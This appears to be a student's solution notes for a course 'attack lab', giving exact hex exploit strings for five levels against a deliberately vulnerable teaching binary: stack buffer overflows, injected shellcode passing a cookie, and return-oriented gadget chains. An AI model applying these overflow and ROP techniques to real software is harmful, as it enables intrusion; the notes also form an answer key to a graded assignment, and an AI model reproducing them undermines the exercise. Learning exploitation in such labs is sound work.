# Solution With Notes

## Level 1
- touch1 address: 0x00000000004017c0

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp      // Allocates 28 bytes
  ...
```

**String**: 
```
00 00 00 00 00 00 00 00 /* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00 /* touch1 address */
```

## Level 2
- touch2 address: 0x00000000004017ec

<ins> Exploit code:
```
   0:	bf fa 97 b9 59       	mov    $0x59b997fa, %edi    // Cookie value
   5:	c3                   	ret    
```

<ins> Format: 
  1. Filler
  2. Address of exploit code, *%rsp on getbuf ret
  3. Address of touch2, *%rsp on exploit code ret
  4. Exploit code

- Exploit code address: getbuf starting %rsp + 16 = 0x55685fc0 + 0x10 = 0x55685fd0

**String**:
```
00 00 00 00 00 00 00 00 /* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
d0 5f 68 55 00 00 00 00 /* exploit code address */
ec 17 40 00 00 00 00 00 /* touch2 address */
bf fa 97 b9 59 c3       /* exploit code */
```

## Level 3
- touch3 address: 0x00000000004018fa

<ins> Format: 
  1. Filler
  2. Address of exploit code
  4. Address of touch3
  5. Cookie string, 9 bytes
  6. Exploit code

- Exploit code address: getbuf starting %rsp + 16 + 9 = 0x55685fd9
- Cookie string: "59b997fa" -> hex -> 35 39 62 39 39 37 66 61 00
- Cookie string address: getbuf starting %rsp + 16 = 0x55685fd0

<ins> Exploit code:
```
   0:	bf d0 5f 68 55       	mov    $0x55685fd0, %edi      // Set argument 1 to point to cookie string (upper 32 bits set to 0)
   5:	c3                   	ret    
```

**String**:
```
00 00 00 00 00 00 00 00 /* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
d9 5f 68 55 00 00 00 00 /* exploit code address */
fa 18 40 00 00 00 00 00 /* touch3 address */
35 39 62 39 39 37 66 61 /* cookie string */
00
bf d0 5f 68 55 c3       /* exploit code */
```

## Level 4
- touch2 address: 0x00000000004017ec

| Address   | Operation |
| -------- | ------- | 
| 4019a2    | movq %rax, %rdi    |
| 4019ab    | popq %rax    |
    
    

**String**:
```
00 00 00 00 00 00 00 00 /* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* popq %rax */
fa 97 b9 59 00 00 00 00 /* cookie value */
a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
ec 17 40 00 00 00 00 00 /* goto touch2 */
```

## Level 5
- touch3 address: 0x00000000004018fa

| Address   | Operation |
| -------- | ------- | 
| 4019a2    | movq %rax, %rdi    |
| 401a06    | movq %rsp, %rax    |
| 4019dd    | movl %eax, %edx    |
| 401a34    | movl %edx, %ecx    |
| 401a13    | movl %ecx, %esi    |
| 4019ab    | popq %rax    |

- Useful function: add_xy, address: 0x00000000004019d6

**String**:
```
/* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Get offset and move it to %rsi */
ab 19 40 00 00 00 00 00 /* popq %rax, %rax = offset value */
40 00 00 00 00 00 00 00 /* offset value = 0x40 */
dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */

/* Get pointer to 2 lines below this one, add it to offset to get the pointer to cookie string */
06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */
a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
d6 19 40 00 00 00 00 00 /* goto add_xy */

a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
fa 18 40 00 00 00 00 00 /* goto touch3 */

/* cookie string */
35 39 62 39 39 37 66 61
00
```
